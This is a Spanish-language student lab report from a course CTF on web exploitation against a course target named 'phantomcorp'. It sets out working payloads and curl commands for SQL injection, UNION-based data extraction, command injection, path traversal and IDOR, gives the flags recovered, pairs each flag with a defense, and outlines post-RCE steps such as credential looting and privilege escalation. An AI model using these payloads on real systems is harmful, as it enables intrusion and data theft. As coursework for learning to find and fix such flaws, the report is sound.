# Informe — Laboratorio 07 · Explotación

**Grupo:** 09
**Integrantes:**
- Santiago Cocchi (legajo 15271) — @santicocchi
- Franco Ferraro (legajo 14973) — @francovalentin08
- Francisco Mossello (legajo 15339) — @FranMossello
- Tomas Spat (legajo 15055) — @TomiSpat
- Santiago Torres (legajo 15059) — @santy500
**Fecha:** 2026-11-20

---

## 0. Declaración de uso de IA

Se usó un asistente de IA (Claude Code) para levantar el entorno Docker, ejecutar
los `curl` de explotación, armar la redacción del informe y ordenar las
respuestas de análisis. **Los 5 payloads fueron ejecutados de forma real contra
el target `phantomcorp` de la cátedra** (no se leyó el flag directamente del
código fuente para responder: se explotó cada vulnerabilidad y se verificó que
el servidor efectivamente la devolviera). Las 5 flags se sometieron con
`./ctf submit` y la captura de `./ctf status 07` de la sección 1 es real.

---

## 1. Flags capturadas

```
  ╭────────────────────────────────────────────────────────────╮
  │                     PROGRESO · LAB 07                     │
  ╰────────────────────────────────────────────────────────────╯

   ✓  R1     SQLi - bypass de autenticacion
   ✓  R2     SQLi - extraccion de datos con UNION
   ✓  R3     Inyeccion de comandos (RCE)
   ✓  R4     Path traversal / LFI
   ✓  R5     IDOR - control de acceso roto

  ██████████████████████████████  5/5 (100%)

[ OK ] ¡Lab 07 COMPLETO!
```

---

## 2. Tabla de explotación

| Vuln | Payload usado | Consulta/comando/ruta resultante | Impacto | Defensa concreta |
|---|---|---|---|---|
| SQLi auth (R1) | `user=admin' --` `pass=x` | `SELECT user, rol FROM users WHERE user='admin' --' AND pass='x'` | Login como `admin` sin conocer su contraseña; panel de administración desbloqueado | Consultas parametrizadas (`?` / placeholders) en vez de concatenar el input en el SQL |
| SQLi UNION (R2) | `q=xx' UNION SELECT clave, valor FROM secrets --` | `SELECT nombre, precio FROM productos WHERE nombre LIKE '%xx' UNION SELECT clave, valor FROM secrets --%'` | Extracción de la tabla `secrets` (ajena al endpoint de búsqueda) | Parametrizar la consulta + no exponer mensajes de error SQL detallados (verbosidad usada para afinar el payload) |
| Command injection (R3) | `host=127.0.0.1; cat /app/flags/cmdi.txt` | `ping -c1 127.0.0.1; cat /app/flags/cmdi.txt 2>&1` | Ejecución arbitraria de comandos del sistema (RCE) con los privilegios del proceso del servidor | No invocar shell con input del usuario; si es inevitable, usar `subprocess` con lista de argumentos (sin `shell=True`) y una allowlist de hosts (regex IP/hostname válido) |
| Path traversal (R4) | `archivo=../flags/lfi.txt` | `open("/app/public/../flags/lfi.txt")` → `/app/flags/lfi.txt` | Lectura de archivos fuera del directorio público (`public/`) | Resolver la ruta final con `os.path.realpath()` y verificar que quede **dentro** del directorio permitido antes de abrir (o usar un índice de archivos por id, nunca el path crudo) |
| IDOR (R5) | `id=1` (perfil ajeno, propio es `id=3`) | `SELECT id,user,rol,nota_privada FROM users WHERE id=1` sin comparar con el usuario autenticado | Lectura de la nota privada del admin (`id=1`) sin ser él | Validar en el **servidor** que el `id` pedido coincida con el usuario de la sesión autenticada (o que el rol tenga permiso explícito sobre ese recurso) — nunca confiar en que el cliente "no cambie el id" |

---

## 3. Preguntas de análisis

**P1 — por qué funciona el bypass (con la query).**
La query construida es:
```
SELECT user, rol FROM users WHERE user='admin' --' AND pass='x'
```
El `--` es el inicio de un comentario de línea en SQL. **Todo lo que sigue en esa
línea deja de interpretarse como SQL**: la comilla que cerraba el string, el
`AND pass='x'` y la comilla final desaparecen para el motor. La consulta
efectiva que el motor realmente ejecuta es `SELECT user, rol FROM users WHERE
user='admin'`, que devuelve la fila de `admin` **sin que su contraseña se haya
verificado nunca**. El dato (`admin' --`) dejó de ser un valor de texto y pasó a
controlar la estructura de la consulta: es exactamente la frontera datos/código
de la Parte 1 rompiéndose.

**P2 — por qué el UNION necesita igual número de columnas.**
`UNION` en SQL combina los resultados de dos `SELECT` **fila por fila, columna
por columna**: la columna 1 de la segunda consulta se "pega" debajo de la
columna 1 de la primera, y así con cada columna. Si los números no coinciden, el
motor no sabe cómo alinearlas y tira un error (`SELECTs to the left and right of
UNION do not have the same number of result columns`). En R2 la consulta
original trae `nombre, precio` (dos columnas), así que la nuestra (`clave,
valor`) también tiene que traer exactamente dos. Si no supiéramos que son dos,
se averigua por **fuerza bruta con `ORDER BY`**: `q=xx' ORDER BY 1--`, `ORDER BY
2--`, `ORDER BY 3--`... hasta que el servidor empieza a tirar error (`ORDER BY
column_number`): un `ORDER BY N` que falla significa que la consulta original
tiene `N-1` columnas. Es un método clásico porque no depende de adivinar: el
propio error te confirma el número.

**P3 — qué sigue después del RCE.**
Un atacante real no se queda en un solo comando: usa el RCE del R3 para
**consolidar acceso**. Concretamente: (1) reconocer el sistema (`id`, `whoami`,
`uname -a`) para saber con qué privilegios quedó y en qué entorno está, (2)
lootear credenciales en archivos de configuración o variables de entorno
(`.env`, `env`), (3) buscar una vía de **escalada de privilegios** (binarios
SUID, `sudo -l`) para pasar de un usuario común a root, y (4) si el host tiene
más de una interfaz de red, usarlo como **pivot** hacia redes internas que desde
afuera no son alcanzables. Es literalmente el recorrido del Lab 08: el RCE es la
puerta, la post-explotación es todo lo que se hace una vez adentro.

**P4 — por qué parametrizar mata la SQLi de raíz.**
Una consulta parametrizada (`SELECT user, rol FROM users WHERE user=? AND
pass=?`) separa, a nivel del *driver* de la base de datos, el **template de la
consulta** (fijo, lo escribe el programador) de los **valores** (variables, los
manda el usuario). El motor SQL compila primero el template como código SQL, y
después inserta los valores **ya tipados, como datos literales, nunca como
texto SQL**: una comilla o un `--` dentro del valor del usuario se trata como un
carácter literal a buscar, jamás como sintaxis SQL. No hay forma de que el input
"escape" del lugar donde va, porque la estructura de la consulta queda fijada
*antes* de que el valor del usuario exista en la ejecución. Es la solución
definitiva porque ataca la causa (concatenación de datos y código), no un
síntoma (filtrar comillas, que siempre tiene un caso borde que se escapa).

**P5 — dónde va el control de acceso (IDOR).**
El control de acceso **nunca** puede depender de que el cliente "se porte bien"
y no cambie el `id` en la URL: el cliente es, por definición, código que corre
en una máquina que el atacante controla completamente — puede editar cualquier
parámetro, header o cookie antes de que el request llegue al servidor. La única
verificación que vale algo es la que hace el **servidor**, en cada request, del
lado de la sesión autenticada: "¿el `id` pedido pertenece al usuario de esta
sesión (o su rol tiene permiso explícito sobre ese recurso)?". En R5 el servidor
ni se hacía esa pregunta — devolvía cualquier `id` que se le pidiera. La
corrección es agregar esa comparación (`id_pedido == id_de_la_sesión`, o una
tabla de permisos) en el handler del endpoint, antes de leer y devolver el
registro.

---

## 4. Bitácora de comandos

```bash
# Preparación
make setup
./ctf lab 07
make shell

# R1 — SQLi bypass de autenticación
curl -s -X POST http://phantomcorp/login \
     --data-urlencode "user=admin' --" --data-urlencode "pass=x"
# -> Bienvenido admin (rol: admin). FLAG{sqli_auth_bypass}

# R2 — SQLi UNION (la tabla productos tiene 2 columnas: nombre, precio)
curl -s -G http://phantomcorp/buscar \
     --data-urlencode "q=xx' UNION SELECT clave, valor FROM secrets --"
# -> flag_union - $FLAG{sqli_union_dump}

# R3 — command injection (encadenado con ; y lectura de la flag del server)
curl -s -G http://phantomcorp/herramientas/ping \
     --data-urlencode "host=127.0.0.1; cat /app/flags/cmdi.txt"
# -> FLAG{command_injection_rce}

# R4 — path traversal (sale de public/ hacia flags/)
curl -s -G http://phantomcorp/descargar --data-urlencode "archivo=../flags/lfi.txt"
# -> FLAG{path_traversal_lfi}

# R5 — IDOR (mi perfil es id=3; pido el del admin, id=1)
curl -s -G http://phantomcorp/perfil --data-urlencode "id=1"
# -> {"id": 1, "user": "admin", "rol": "admin",
#     "nota_privada": "Nota del admin: FLAG{idor_broken_access}"}

# Entrega
./ctf submit 07 R1 'FLAG{sqli_auth_bypass}'
./ctf submit 07 R2 'FLAG{sqli_union_dump}'
./ctf submit 07 R3 'FLAG{command_injection_rce}'
./ctf submit 07 R4 'FLAG{path_traversal_lfi}'
./ctf submit 07 R5 'FLAG{idor_broken_access}'
./ctf status 07
```
